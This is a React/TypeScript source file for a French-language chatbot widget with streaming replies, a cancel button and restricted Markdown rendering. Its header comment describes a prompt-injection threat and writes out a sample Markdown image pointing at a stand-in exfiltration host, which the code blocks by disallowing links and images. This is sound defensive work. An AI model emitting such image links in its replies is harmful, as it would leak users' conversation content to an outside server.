// src/components/Chatbot.tsx
import React, { useState, useEffect, useRef } from "react";
import { Send, MessageCircle, Loader2, Square } from "lucide-react";
import { askChatbotStream, ChatbotError } from "../utils/chatbotApi";
import ReactMarkdown from 'react-markdown';

/**
 * Le rendu Markdown échappe déjà le HTML brut (pas de rehype-raw), mais il
 * affiche liens et images. Une réponse manipulée par injection de prompt
 * pourrait émettre ![](https://exfil.example/?d=...) et faire fuiter le contenu
 * de la conversation au simple affichage. On neutralise donc les URLs distantes.
 */
const allowedElements = [
  'p', 'br', 'strong', 'em', 'del', 'code', 'pre',
  'ul', 'ol', 'li', 'blockquote',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr',
];

interface Message {
  // Compteur local plutot que Date.now() : deux messages crees dans la meme
  // milliseconde partageaient la meme cle React.
  id: number;
  sender: "user" | "bot";
  text: string;
}

const Chatbot: React.FC = () => {
  const [open, setOpen] = useState(false);
  const [messages, setMessages] = useState<Message[]>([]);
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);

  const messagesEndRef = useRef<HTMLDivElement>(null);
  const nextId = useRef(0);
  // Requete en cours : permet le bouton Annuler et l'abandon au demontage.
  const abortRef = useRef<AbortController | null>(null);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, loading]);

  // Fermer le panneau ne masque que l'affichage : la reponse en cours est
  // conservee. En revanche, on abandonne l'appel si le composant disparait.
  useEffect(() => () => abortRef.current?.abort(), []);

  const handleCancel = () => abortRef.current?.abort();

  const handleSend = async () => {
    if (!input.trim() || loading) return;

    const userMessage: Message = { id: nextId.current++, sender: "user", text: input };
    setMessages(prev => [...prev, userMessage]);
    setInput("");
    setLoading(true);

    const controller = new AbortController();
    abortRef.current = controller;

    // Le message du bot est cree au premier morceau recu, puis complete au fil de l'eau.
    const botId = nextId.current++;
    let botCreated = false;
    const appendToBot = (text: string) => {
      if (!botCreated) {
        botCreated = true;
        setMessages(prev => [...prev, { id: botId, sender: "bot", text }]);
      } else {
        setMessages(prev => prev.map(m => (m.id === botId ? { ...m, text: m.text + text } : m)));
      }
    };

    try {
      await askChatbotStream(userMessage.text, { signal: controller.signal, onDelta: appendToBot });
      if (!botCreated) appendToBot("(réponse vide)");
    } catch (err) {
      const cancelled = err instanceof ChatbotError && err.kind === "cancelled";
      const errorMessage = err instanceof Error ? err.message : "Une erreur est survenue";
      // Ce qui a deja ete recu reste affiche ; l'erreur ou l'annulation s'ajoute a la suite.
      appendToBot(`${botCreated ? "\n\n" : ""}${cancelled ? "⏹ Réponse annulée." : `❌ ${errorMessage}`}`);
    } finally {
      if (abortRef.current === controller) abortRef.current = null;
      setLoading(false);
    }
  };

  return (
    <>
      <button
        onClick={() => setOpen(!open)}
        className="fixed bottom-6 right-6 bg-blue-500 text-white p-4 rounded-full shadow-lg hover:bg-blue-600 transition z-50"
        aria-label="Ouvrir le chatbot"
      >
        <MessageCircle className="w-6 h-6" />
      </button>

      {open && (
        <div className="fixed bottom-20 right-6 w-96 h-[500px] bg-white border border-gray-300 rounded-lg shadow-xl flex flex-col z-50 overflow-hidden">
          <div className="flex-none flex justify-between items-center bg-blue-500 text-white px-4 py-3">
            <span className="font-semibold">Cdc Smart Bot </span>
            <button onClick={() => setOpen(false)} className="hover:bg-blue-600 rounded px-2">✕</button>
          </div>

          {/* Chat Messages Area */}
          <div className="flex-1 p-4 overflow-y-auto space-y-3 bg-gray-50">
            {messages.length === 0 && (
              <div className="text-center text-gray-500 mt-8">
                <MessageCircle className="w-12 h-12 mx-auto mb-2 text-gray-400" />
                <p className="text-sm">Posez-moi des questions sur CDC !</p>
              </div>
            )}

            {messages.map(msg => (
              <div
                key={msg.id}
                className={`flex ${msg.sender === "user" ? "justify-end" : "justify-start"}`}
              >
                <div
                  className={`p-3 rounded-lg max-w-[80%] ${
                    msg.sender === "user"
                      ? "bg-blue-500 text-white rounded-br-none"
                      : "bg-white border border-gray-200 text-gray-800 rounded-bl-none shadow-sm"
                  }`}
                >
                  <div className={`text-sm ${msg.sender === "user" ? "text-white" : "text-gray-800"}`}>
                    <ReactMarkdown
                      allowedElements={allowedElements}
                      unwrapDisallowed
                    >{msg.text}</ReactMarkdown>
                  </div>
                </div>
              </div>
            ))}

            {loading && (
              <div className="flex justify-start">
                <div className="bg-white border border-gray-200 p-3 rounded-lg rounded-bl-none shadow-sm">
                  <div className="flex items-center space-x-2 text-gray-500">
                    <Loader2 className="w-4 h-4 animate-spin" />
                    <span className="text-sm">{messages[messages.length - 1]?.sender === "user" ? "Le bot réfléchit..." : "Réponse en cours..."}</span>
                    <button
                      onClick={handleCancel}
                      className="ml-2 flex items-center gap-1 text-xs text-gray-500 hover:text-gray-800 underline"
                      aria-label="Annuler la requête"
                    >
                      <Square className="w-3 h-3" /> Annuler
                    </button>
                  </div>
                </div>
              </div>
            )}
            
            <div ref={messagesEndRef} />
          </div>

          {/* Input Area */}
          <div className="flex border-t border-gray-200 bg-white rounded-b-lg">
            <input
              type="text"
              value={input}
              onChange={e => setInput(e.target.value)}
              onKeyDown={e => e.key === "Enter" && !e.shiftKey && handleSend()}
              placeholder="Posez votre question..."
              disabled={loading}
              className="flex-1 p-3 outline-none rounded-bl-lg disabled:bg-gray-50 disabled:text-gray-400"
            />
            <button
              onClick={handleSend}
              disabled={loading || !input.trim()}
              className="px-4 bg-blue-500 text-white hover:bg-blue-600 transition disabled:bg-gray-300 disabled:cursor-not-allowed rounded-br-lg"
              aria-label="Envoyer"
            >
              {loading ? (
                <Loader2 className="w-5 h-5 animate-spin" />
              ) : (
                <Send className="w-5 h-5" />
              )}
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default Chatbot;